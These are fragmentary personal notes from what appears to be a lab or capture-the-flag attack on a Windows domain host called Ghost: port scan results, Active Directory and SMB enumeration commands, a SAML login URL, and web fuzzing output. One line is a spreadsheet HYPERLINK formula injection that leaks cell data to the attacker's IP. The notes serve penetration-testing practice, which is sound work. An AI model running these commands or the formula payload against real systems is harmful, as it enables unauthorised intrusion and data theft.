## Ghost Windows Insane 

- [+]:	TargetIP
   >>	10.10.11.24



## recon 

- [] nmap scan :


53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s --sqlite
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http    --almost empty website 
8443/tcp  open  https-alt  -- federtaion.ghost.htb
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49670/tcp open  unknown
49676/tcp open  unknown
57917/tcp open  unknown
60351/tcp open  unknown
60380/tcp open  unknown





-------------------------

 kerbrute userenum -d ghost.htb --dc dc01.ghost.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
 `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. 
 
 
 enu4mlinux
  ====================================( Session Check on 10.10.11.24 )====================================


[+] Server 10.10.11.24 allows sessions using username '', password ''


 =================================( Getting domain SID for 10.10.11.24 )=================================

Domain Name: GHOST
Domain Sid: S-1-5-21-4084500788-938703357-3654145966




 
 
 
 1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
 `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. 
 
 senum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>
 
 rpcclient -U ""
 samrdump.py
 
 enum4linux ip -A
https://ghost.htb:8443/login

(web mail app outlook 
© 2018 Microsoft) 
https://federation.ghost.htb/adfs/ls/?SAMLRequest=nVNNj9owEP0rke%2FkCzcNFmFFw6FI2zaCtIe9rIwzWSI5duqZ7NJ%2FXyWQXQ4tB65%2BM2%2FevHlePpxa7b2Cw8aajEV%2ByB5WS5St7sS6p6PZwe8ekLxTqw2KEchY74ywEhsURraAgpTYr789itgPRecsWWU187abjD1XoaqTBFIua87nvE6lmqs0llG0SPmnZFEd0sMiVQnzfk0iYj9k3haxh61BkoYyFocxn4WfZ9G8jCMRJSJa%2BBEPn5hXXMZ9aUzVmJfb2g7nIhRfy7KYFT%2F2JfM2gNQYSePoI1GHIghqqMCNb%2F7L0SL5RzoEsqox0Bgwb40IbkBza7Bvwe3BvTYKfu4ePziUdfDRLVLO52eKwcSgs0g7wM4aBHZ2XIw7uyurb28jJxVsdWPmMrjink77Xbaw3RRWN%2BrPPadda23fcgeSIGPkemDBRH0JDFRjfHJrCE53xSe3bSddg8Nd4CQVTTZdE%2BdaIu6gvse0m2VKqIEaUBQS8c26akgaKIKqdNJgZx1drP2XntUZ%2B48d7%2Bj1F1v9BQ%3D%3D&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=sJxFUz4xuajopA7riyNXS744tpby2SpWdx9w%2BTJZ%2Bhm6g8dpZaZGoq6piSZSF23XaDjWA1dk9uAudQHkEJvCXqOruz%2FtCphBevMzQHK4P8pv5LU4yvZjHVM4IrrMCVC8mB%2Fl5YpdUwdLNgyZUwKQkzwzrsI451iWQJALhYu7lcxWA1lXpE1hkifz3rlOJrCPuPJ9BYqXOGbZUi8QvrYLX6AOAYorJRPlN1y5gDbtVikNd%2Bt383WSlG3neNgugs7z%2F357x2Nb9cB0GQPieE4mO%2B6YzFuQSqgIsntKwgWad9qxjPUUg5GTjH%2F2LG6sJlu6AQcrxlGYERBSXmwSuaJN8w%3D%3D


http://10.10.11.24:8008/robots.txt
http://10.10.11.24:8008/
"Ghost 5.78">

Target: http://ghost.htb:8008/
Total requests: 4989

=====================================================================
000000058:   307        0 L      52 W       3968 Ch     "intranet"     


=HYPERLINK("http://10.10.16.81:8000?leak="&A2&" and "&2, "Click for more")
http://ghost.htb:8008/ghost/.well-known/jwks.json

User-agent: *
Sitemap: http://ghost.htb/sitemap.xml
Disallow: /ghost/  -> http://10.10.11.24:8008/ghost/   		( GHOST ADMIN )
Disallow: /p/
Disallow: /email/
Disallow: /r/
Disallow: /webmentions/receive/

